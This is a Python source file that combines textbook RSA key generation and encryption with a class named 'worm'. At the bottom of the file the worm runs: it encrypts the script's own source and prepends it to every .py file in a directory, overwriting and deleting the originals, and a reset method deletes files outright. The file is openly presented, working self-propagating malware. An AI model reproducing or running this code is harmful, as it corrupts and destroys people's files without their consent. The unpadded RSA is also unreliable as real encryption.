import os
import random, sys, os
##########################################
#cryptomath module
def gcd(a, b):
    while a != 0:
        a, b = b % a, a
    return b

def findModInverse(a, m):
    if gcd(a, m) != 1:
        return None
    u1, u2, u3 = 1, 0, a
    v1, v2, v3 = 0, 1, m
    while v3 != 0:
        q = u3 // v3
        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q *v3), v1, v2, v3
    return u1 % m

##########################################
# rabin miller

# Primality Testing with the Rabin-Miller Algorithm

def rabinMiller(num):
    s = num - 1
    t = 0

    while s % 2 == 0:
        s = s // 2
        t += 1

    for trials in range(5):
        a = random.randrange(2, num - 1)
        v = pow(a, s, num)
        if v != 1:
            i = 0
            while v != (num - 1):
                if i == t - 1:
                    return False
                else:
                    i = i + 1
                    v = (v ** 2) % num
    return True

def isPrime(num):
    if (num < 2):
        return False

    lowPrimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59,
                 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127,
                 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191,
                 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257,
                 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331,
                 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401,
                 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467,
                 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563,
                 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631,
                 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709,
                 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797,
                 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877,
                 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967,
                 971, 977, 983, 991, 997]

    if num in lowPrimes:
        return True

    for prime in lowPrimes:
        if (num % prime) == 0:
            return False

    return rabinMiller(num)

def generateLargePrime(keysize = 1024):
    while True:
        num = random.randrange(2 ** (keysize - 1), 2 ** (keysize))
        if isPrime(num):
            return num

##########################################
# rsa key generator
def main():
    print('Making key files...')
    makeKeyFiles('rsa', 1024)
    print('Key files generation successful.')

def generateKey(keySize):
    print('Generating prime p...')
    p = generateLargePrime(keySize)
    print('Generating prime q...')
    q = generateLargePrime(keySize)
    n = p * q

    print('Generating e that is relatively prime to (p - 1) * (q - 1)...')
    while True:
        e = random.randrange(2 ** (keySize - 1), 2 ** (keySize))
        if gcd(e, (p - 1) * (q - 1)) == 1:
            break

    print('Calculating d that is mod inverse of e...')
    d = findModInverse(e, (p - 1) * (q - 1))

    publicKey = (n, e)
    privateKey = (n, d)
    return (publicKey, privateKey)

def makeKeyFiles(name, keySize):
    if os.path.exists('%s_pubkey.txt' % (name)) or os.path.exists('%s_privkey.txt' % (name)):
        print('\nWARNING:')
        print('"%s_pubkey.txt" or "%s_privkey.txt" already exists. \nUse a different name or delete these files and re-run this program.' % (name, name))
        sys.exit()

    publicKey, privateKey = generateKey(keySize)
    print('\nWriting public key to file %s_pubkey.txt...' % name)
    with open('%s_pubkey.txt' % name, 'w') as fo:
        fo.write('%s,%s,%s' % (keySize, publicKey[0], publicKey[1]))

    print('Writing private key to file %s_privkey.txt...' % name)
    with open('%s_privkey.txt' % name, 'w') as fo:
        fo.write('%s,%s,%s' % (keySize, privateKey[0], privateKey[1]))

##########################################
# rsa cipher

DEFAULT_BLOCK_SIZE = 128
BYTE_SIZE = 256

def cipherMain():
    filename = 'encrypted_file.txt'
    response = input(r'Encrypte\Decrypt [e\d]: ')

    if response.lower().startswith('e'):
        mode = 'encrypt'
    elif response.lower().startswith('d'):
        mode = 'decrypt'

    if mode == 'encrypt':
        if not os.path.exists('rsa_pubkey.txt'):
            makeKeyFiles('rsa', 1024)

        # message = input('\nEnter message: ')
        pubKeyFilename = 'rsa_pubkey.txt'
        print('Encrypting and writing to %s...' % (filename))
        message = open(__file__, 'r').readlines()
        encryptedMessage = open('encryptedText.drew', 'a')

        for line in message:
            encryptedText = encryptAndWriteToFile(filename, pubKeyFilename, line)
            encryptedMessage.write(encryptedText)
            encryptedMessage.write('\n')


    elif mode == 'decrypt':
        privKeyFilename = 'rsa_privkey.txt'
        print('Reading from %s and decrypting...' % (filename))
        decryptedText = readFromFileAndDecrypt(filename, privKeyFilename)
        print('writing decryption to rsa_decryption.txt...')
        with open('rsa_decryption.txt', 'w') as dec:
            dec.write(decryptedText)

        print('\nDecryption:')
        print(decryptedText)


def getBlocksFromText(message, blockSize=DEFAULT_BLOCK_SIZE):
    messageBytes = message.encode('ascii')

    blockInts = []
    for blockStart in range(0, len(messageBytes), blockSize):
        blockInt = 0
        for i in range(blockStart, min(blockStart + blockSize, len(messageBytes))):
            blockInt += messageBytes[i] * (BYTE_SIZE ** (i % blockSize))
        blockInts.append(blockInt)
    return blockInts


def getTextFromBlocks(blockInts, messageLength, blockSize=DEFAULT_BLOCK_SIZE):
    message = []
    for blockInt in blockInts:
        blockMessage = []
        for i in range(blockSize - 1, -1, -1):
            if len(message) + i < messageLength:
                asciiNumber = blockInt // (BYTE_SIZE ** i)
                blockInt = blockInt % (BYTE_SIZE ** i)
                blockMessage.insert(0, chr(asciiNumber))
        message.extend(blockMessage)
    return ''.join(message)


def encryptMessage(message, key, blockSize=DEFAULT_BLOCK_SIZE):
    encryptedBlocks = []
    n, e = key

    for block in getBlocksFromText(message, blockSize):
        encryptedBlocks.append(pow(block, e, n))
    return encryptedBlocks


def decryptMessage(encryptedBlocks, messageLength, key, blockSize=DEFAULT_BLOCK_SIZE):
    decryptedBlocks = []
    n, d = key
    for block in encryptedBlocks:
        decryptedBlocks.append(pow(block, d, n))
    return getTextFromBlocks(decryptedBlocks, messageLength, blockSize)


def readKeyFile(keyFilename):
    with open(keyFilename) as fo:
        content = fo.read()
    keySize, n, EorD = content.split(',')
    return (int(keySize), int(n), int(EorD))


def encryptAndWriteToFile(messageFilename, keyFilename, message, blockSize=DEFAULT_BLOCK_SIZE):
    keySize, n, e = readKeyFile(keyFilename)
    if keySize < blockSize * 8:
        sys.exit('ERROR: Block size is %s bits and key size is %s bits. The RSA cipher requires the block size to be equal to or greater than the key size. Either decrease the block size or use different keys.' % (blockSize * 8, keySize))

    encryptedBlocks = encryptMessage(message, (n, e), blockSize)

    for i in range(len(encryptedBlocks)):
        encryptedBlocks[i] = str(encryptedBlocks[i])
    encryptedContent = ','.join(encryptedBlocks)
    encryptedContent = '%s_%s_%s' % (len(message), blockSize, encryptedContent)
    with open(messageFilename, 'w') as fo:
        fo.write(encryptedContent)
    return encryptedContent


def readFromFileAndDecrypt(messageFilename, keyFilename):
    keySize, n, d = readKeyFile(keyFilename)
    with open(messageFilename) as fo:
        content = fo.read()
    messageLength, blockSize, encryptedMessage = content.split('_')
    messageLength = int(messageLength)
    blockSize = int(blockSize)

    if keySize < blockSize * 8:
        sys.exit('ERROR: Block size is %s bits and key size is %s bits. The RSA cipher requires the block size to be equal to or greater than the key size. Did you specify the correct key file and encrypted file?' % (blockSize * 8, keySize))

    encryptedBlocks = []
    for block in encryptedMessage.split(','):
        encryptedBlocks.append(int(block))

    return decryptMessage(encryptedBlocks, messageLength, (n, d), blockSize)


class worm():

    def __init__(self):

        # list of directories
        self.files = []
        self.temp = []
        # list of paths
        self.paths = []

        # the virus that we are inserting into
        self.virus = open('encryptedText.drew', 'r').readlines()

        # the initial path that we are searching along
        self.path = '/Users/Drew/Projects/garbage'

        for root, directories, files in os.walk(self.path):
            self.temp.append(files)

        # if we found at least one file, print it
        if len(self.temp) > 0:
            # we only want the first element
            self.temp = self.temp[0]

        # find every python file that is not a cache file
        for file in self.temp:
            # filters out the cache file
            if '.py' in file and '.pyc' not in file:
                self.files.append('/'.join([self.path,file]))

    def infect(self):
        # infect every python file we found
        for file in self.files:
            # only open the files as read
            with open(file, 'r') as r:
                # construct the name of the infected file
                newName = (str(file) + '.infected')
                # create the new, infected file
                with open(newName, 'a') as w:
                    for line in self.virus:
                        w.write(line)
                    for line in r.readlines():
                        w.write(line)
            # remove the old file
            os.remove(file)
            # rename the infected file to the old file name
            os.rename(newName, file)

    def reset(self):
        for file in self.files:
            os.remove(file)

cipherMain()
# make a worm instance
worm = worm()
worm.infect()
